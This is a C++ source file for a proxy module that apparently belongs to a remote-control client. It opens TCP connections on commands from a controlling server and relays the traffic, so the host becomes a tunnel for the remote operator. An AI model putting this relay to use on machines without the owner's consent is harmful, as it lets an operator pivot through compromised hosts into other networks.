// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "ProxyManager.h"
#include <MSTcpIP.h>
#include <TCHAR.h>
#include "stdio.h"
#include <process.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CProxyManager::CProxyManager(ISocketBase* pClient, int n, void* user) : CManager(pClient)
{
    InitializeCriticalSection(&m_cs);
    m_bUse = TRUE;
    m_nSend = 0;
    Threads = 0;
    BYTE cmd = COMMAND_PROXY;
    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
    pClient->Send2Server((char*)&cmd, 1, &mask);
    Mprintf("CProxyManager create: %p\n", this);
}

CProxyManager::~CProxyManager()
{
    m_bUse = FALSE;
    Sleep(1500);
    std::map<DWORD, SOCKET*>::iterator it_oneofserver = list.begin();
    while (it_oneofserver != list.end()) {
        SOCKET* p_socket = (SOCKET*)(it_oneofserver->second);
        if (p_socket) {
            if (*p_socket != INVALID_SOCKET) {
                closesocket(*p_socket);
                *p_socket = 0;
            }
            SAFE_DELETE(it_oneofserver->second);
        }
        list.erase(it_oneofserver++);
    }
    Wait();
    DeleteCriticalSection(&m_cs);
    Mprintf("CProxyManager destroy: %p\n", this);
}

void CProxyManager::SendConnectResult(LPBYTE lpBuffer, DWORD ip, USHORT port)
{
    lpBuffer[0] = TOKEN_PROXY_CONNECT_RESULT;
    *(DWORD*)&lpBuffer[5] = ip;
    *(USHORT*)&lpBuffer[9] = port;
    Send(lpBuffer, 11);
}

void CProxyManager::Disconnect(DWORD index)
{
    BYTE buf[5];
    buf[0] = TOKEN_PROXY_CLOSE;
    memcpy(&buf[1], &index, sizeof(DWORD));
    Send(buf, sizeof(buf));
    GetSocket(index,TRUE);
}

void CProxyManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
{
    if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
    if (!m_bUse) return ;
    switch (lpBuffer[0]) {
    /*[1]----[4]----[4]----[2]
    cmd		 id		ip		port*/
    case COMMAND_PROXY_CONNECT: {
        SocksThreadArg arg;
        arg.pThis = this;
        arg.lpBuffer = lpBuffer;
        AddThread(1);
        CloseHandle((HANDLE)__CreateThread(NULL, 0, SocksThread, (LPVOID)&arg, 0, NULL));
        while (arg.lpBuffer)
            Sleep(2);
    }
    break;
    case COMMAND_PROXY_CONNECT_HOSTNAME: {
        SocksThreadArg arg;
        arg.pThis = this;
        arg.lpBuffer = lpBuffer;
        arg.len = nSize;
        AddThread(1);
        CloseHandle((HANDLE)__CreateThread(NULL, 0, SocksThreadhostname, (LPVOID)&arg, 0, NULL));
        while (arg.lpBuffer)
            Sleep(2);
    }
    break;
    case COMMAND_PROXY_CLOSE: {
        GetSocket(*(DWORD*)&lpBuffer[1],TRUE);
    }
    break;
    case COMMAND_PROXY_DATA:
        DWORD index = *(DWORD*)&lpBuffer[1];
        DWORD nRet, nSend = 5, nTry = 0;
        SOCKET* s = GetSocket(index);
        if (!s) return;
        while (s && (nSend < nSize) && nTry < 15) {
            nRet = send(*s, (char*)&lpBuffer[nSend], nSize - nSend, 0);
            if (nRet == SOCKET_ERROR) {
                nRet = GetLastError();
                Disconnect(index);
                break;
            } else {
                nSend += nRet;
            }
            nTry++;
        }
        break;
    }
}

DWORD CProxyManager::SocksThread(LPVOID lparam)
{
    SocksThreadArg* pArg = (SocksThreadArg*)lparam;
    CProxyManager* pThis = pArg->pThis;
    BYTE lpBuffer[11];
    SOCKET* psock=new SOCKET;
    DWORD ip;
    sockaddr_in  sockAddr;
    int nSockAddrLen;
    memcpy(lpBuffer, pArg->lpBuffer, 11);
    pArg->lpBuffer = 0;

    DWORD index = *(DWORD*)&lpBuffer[1];
    *psock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*psock == SOCKET_ERROR) {
        pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
        SAFE_DELETE(psock);
        pThis->AddThread(-1);
        return 0;
    }
    ip = *(DWORD*)&lpBuffer[5];
    // 构造sockaddr_in结构
    sockaddr_in	ClientAddr;
    ClientAddr.sin_family = AF_INET;
    ClientAddr.sin_port = *(u_short*)&lpBuffer[9];
    ClientAddr.sin_addr.S_un.S_addr = ip;

    if (connect(*psock, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) {
        pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
        SAFE_DELETE(psock);
        pThis->AddThread(-1);
        return 0;
    }

    pThis->list.insert(std::pair<DWORD, SOCKET*>(index, psock));
    memset(&sockAddr, 0, sizeof(sockAddr));
    nSockAddrLen = sizeof(sockAddr);
    getsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
    if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
    pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);

    ISocketBase* pClient = pThis->m_ClientObject;
    BYTE* buff = new BYTE[MAX_RECV_BUFFER];
    struct timeval timeout;
    SOCKET socket = *psock;
    fd_set fdSocket;
    FD_ZERO(&fdSocket);
    FD_SET(socket, &fdSocket);
    timeout.tv_sec = 0;
    timeout.tv_usec = 10000;
    buff[0] = TOKEN_PROXY_DATA;
    memcpy(buff + 1, &index, 4);
    while (pClient->IsRunning()) {
        fd_set fdRead = fdSocket;
        int nRet = select(NULL, &fdRead, NULL, NULL, &timeout);
        if (nRet == SOCKET_ERROR) {
            nRet = GetLastError();
            pThis->Disconnect(index);
            break;
        }
        if (nRet > 0) {
            int nSize = recv(socket, (char*)(buff + 5), MAX_RECV_BUFFER - 5, 0);
            if (nSize <= 0) {
                pThis->Disconnect(index);
                break;
            }
            if (nSize > 0)
                pThis->Send(buff, nSize + 5);
        }
    }
    SAFE_DELETE_AR(buff);
    FD_CLR(socket, &fdSocket);
    pThis->AddThread(-1);
    return 0;
}

DWORD CProxyManager::SocksThreadhostname(LPVOID lparam)
{
    SocksThreadArg* pArg = (SocksThreadArg*)lparam;
    CProxyManager* pThis = pArg->pThis;
    BYTE* lpBuffer = new BYTE[pArg->len];
    memcpy(lpBuffer, pArg->lpBuffer, pArg->len);
    pArg->lpBuffer = 0;

    DWORD index = *(DWORD*)&lpBuffer[1];
    USHORT nPort = 0;
    memcpy(&nPort, lpBuffer + 5, 2);
    hostent* pHostent = NULL;
    pHostent = gethostbyname((char*)lpBuffer + 7);
    if (!pHostent) {
        pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
        SAFE_DELETE_AR(lpBuffer);
        return 0;
    }
    SOCKET* psock=new SOCKET;

    sockaddr_in  sockAddr;
    int nSockAddrLen;
    *psock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*psock == SOCKET_ERROR) {
        pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
        SAFE_DELETE_AR(lpBuffer);
        SAFE_DELETE(psock);
        pThis->AddThread(-1);
        return 0;
    }

    // 构造sockaddr_in结构
    sockaddr_in	ClientAddr;
    ClientAddr.sin_family = AF_INET;
    ClientAddr.sin_port = *(u_short*)&lpBuffer[5];
    ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);
    if (connect(*psock, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) {
        pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
        SAFE_DELETE_AR(lpBuffer);
        SAFE_DELETE(psock);
        pThis->AddThread(-1);
        return 0;
    }
    pThis->list.insert(std::pair<DWORD, SOCKET*>(index, psock));

    memset(&sockAddr, 0, sizeof(sockAddr));
    nSockAddrLen = sizeof(sockAddr);
    getsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
    if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
    pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);
    SAFE_DELETE_AR(lpBuffer);
    ISocketBase* pClient = pThis->m_ClientObject;
    BYTE* buff = new BYTE[MAX_RECV_BUFFER];
    struct timeval timeout;
    SOCKET socket = *psock;
    fd_set fdSocket;
    FD_ZERO(&fdSocket);
    FD_SET(socket, &fdSocket);
    timeout.tv_sec = 0;
    timeout.tv_usec = 10000;
    buff[0] = TOKEN_PROXY_DATA;
    memcpy(buff + 1, &index, 4);
    while (pClient->IsRunning()) {
        fd_set fdRead = fdSocket;
        int nRet = select(NULL, &fdRead, NULL, NULL, &timeout);
        if (nRet == SOCKET_ERROR) {
            nRet = GetLastError();
            pThis->Disconnect(index);
            break;
        }
        if (nRet > 0) {
            int nSize = recv(socket, (char*)(buff + 5), MAX_RECV_BUFFER - 5, 0);
            if (nSize <= 0) {
                pThis->Disconnect(index);
                break;
            }
            if (nSize > 0)
                pThis->Send(buff, nSize + 5);
        }
    }
    SAFE_DELETE_AR(buff);
    FD_CLR(socket, &fdSocket);
    pThis->AddThread(-1);
    return 0;
}


SOCKET* CProxyManager::GetSocket(DWORD index, BOOL del)
{
    if (!m_bUse) return NULL;
    CAutoLock locallock(m_cs);
    SOCKET* s = list[index];
    if ( del) {
        if (!s) return s;
        closesocket(*s);
        SAFE_DELETE(s);
        list.erase(index);
    }

    return s;
}
